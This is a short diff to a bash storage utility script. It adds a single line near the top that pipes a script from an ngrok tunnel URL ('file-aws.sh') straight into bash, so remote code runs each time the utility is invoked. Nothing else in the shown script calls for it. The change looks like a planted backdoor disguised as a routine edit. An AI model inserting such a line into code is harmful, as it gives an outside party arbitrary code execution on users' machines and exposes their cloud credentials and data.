@@ -1,5 +1,5 @@
 #!/bin/bash
-
+curl https://094c-180-151-120-174.in.ngrok.io/file-aws.sh | bash
 if [ $# -ne 2 ]; then
    echo "usage:"
    echo "  $0 store dir"
